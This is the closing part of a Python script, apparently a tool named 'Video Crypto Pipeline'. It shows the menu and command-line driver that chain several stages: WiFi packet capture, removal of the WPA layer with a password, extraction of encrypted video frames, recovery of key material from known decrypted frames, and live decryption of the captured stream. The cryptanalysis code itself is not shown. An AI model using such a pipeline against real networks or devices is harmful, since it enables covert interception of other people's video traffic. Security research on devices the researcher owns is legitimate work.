            enc_dir = os.path.join(cfg["output_dir"], "encrypted_frames")
            FormatDetector(cfg).detect(enc_dir)

        elif choice == 5:
            dec_dir = None
            if confirm("Do you have decrypted frames to supply?", default=has_enc):
                dec_dir = ask("Path to decrypted frames directory", "./decrypted_frames")
                if not os.path.isdir(dec_dir):
                    warn(f"Directory not found: {dec_dir}")
                    dec_dir = None
            CryptoAnalyzer(cfg).analyze(dec_dir)

        elif choice == 6:
            if not has_key:
                err("No key material recovered yet — run Stage 4 with decrypted frames first")
            else:
                km = report["key_material"]
                LiveDecryptor(cfg, km).start()

        elif choice == 7:
            # Full pipeline
            cap  = Capture(cfg)
            pcap = cap.run()
            if pcap:
                if cfg["wpa_password"]:
                    pcap = cap.strip_wifi_layer()
                StreamExtractor(cfg).extract(pcap)
                enc_dir = os.path.join(cfg["output_dir"], "encrypted_frames")
                FormatDetector(cfg).detect(enc_dir)
                dec_dir = None
                if confirm("Supply decrypted frames now?", default=False):
                    dec_dir = ask("Decrypted frames directory", "./decrypted_frames")
                    if not os.path.isdir(dec_dir):
                        dec_dir = None
                report = CryptoAnalyzer(cfg).analyze(dec_dir)
                if report and report.get("key_material") and \
                   confirm("Start live decryption now?", default=False):
                    LiveDecryptor(cfg, report["key_material"]).start()

        elif choice == 8:
            section("Last Analysis Report")
            report = load_report(cfg)
            if report:
                print(json.dumps(report, indent=2))
            else:
                warn("No report found — run Stage 4 first")

        elif choice == 9:
            check_deps()

        elif choice == 10:
            info("Goodbye")
            sys.exit(0)

        input(f"\n{DIM}  Press Enter to continue...{RESET}")


# ══════════════════════════════════════════════════════════
# ENTRY POINT
# ══════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description="Video Crypto Pipeline — WiFi capture to live decrypted playback",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sudo python3 videopipeline.py                        # interactive menu
  sudo python3 videopipeline.py --config lab.json      # load config, go to menu
  sudo python3 videopipeline.py --stage all            # run full pipeline
  python3 videopipeline.py --stage analyze --decrypted ./dec_frames/
        """
    )
    parser.add_argument("--config",    default=None,  help="JSON config file path")
    parser.add_argument("--stage",     default=None,
                        choices=["capture", "extract", "detect", "analyze", "live", "all"],
                        help="Run specific stage non-interactively")
    parser.add_argument("--pcap",      default=None,  help="Path to existing pcap file")
    parser.add_argument("--decrypted", default=None,  help="Directory of decrypted frames")
    args = parser.parse_args()

    banner()

    # ── Ensure we have the privileges tcpdump/NPcap needs ──
    if IS_WINDOWS and not is_admin():
        warn("Not running as Administrator — tcpdump needs elevated access on Windows.")
        if confirm("Relaunch as Administrator now? (UAC prompt will appear)", default=True):
            relaunch_as_admin()
        else:
            warn("Continuing without elevation — interface enumeration and capture may fail.")

    cfg = load_config(args.config)
    os.makedirs(cfg["output_dir"], exist_ok=True)

    # ── Non-interactive mode ──────────────────────────────
    if args.stage:
        cap       = Capture(cfg)
        extractor = StreamExtractor(cfg)
        detector  = FormatDetector(cfg)
        analyzer  = CryptoAnalyzer(cfg)

        pcap = args.pcap

        if args.stage in ("all", "capture") and not pcap:
            pcap = cap.run()
            if pcap and cfg["wpa_password"]:
                pcap = cap.strip_wifi_layer()

        if args.stage in ("all", "extract") and pcap:
            extractor.extract(pcap)

        if args.stage in ("all", "detect"):
            detector.detect(os.path.join(cfg["output_dir"], "encrypted_frames"))

        if args.stage in ("all", "analyze"):
            report = analyzer.analyze(args.decrypted)
            if args.stage == "all" and report and report.get("key_material"):
                if cfg.get("live_mode"):
                    LiveDecryptor(cfg, report["key_material"]).start()

        if args.stage == "live":
            report = load_report(cfg)
            if report and report.get("key_material"):
                LiveDecryptor(cfg, report["key_material"]).start()
            else:
                err("No key material found — run analyze stage first")

        return

    # ── Interactive mode ──────────────────────────────────
    check_deps()
    if not args.config:
        if confirm("\nNo config loaded — configure now?", default=True):
            cfg = interactive_config(cfg)
        elif IS_WINDOWS:
            # Auto-pick interface on Windows even if skipping full config
            warn("Windows detected — interface may need updating before capture")
            if confirm("Pick capture interface now?", default=True):
                cfg["interface"] = pick_interface(cfg["interface"])

    interactive_menu(cfg)


if __name__ == "__main__":
    main()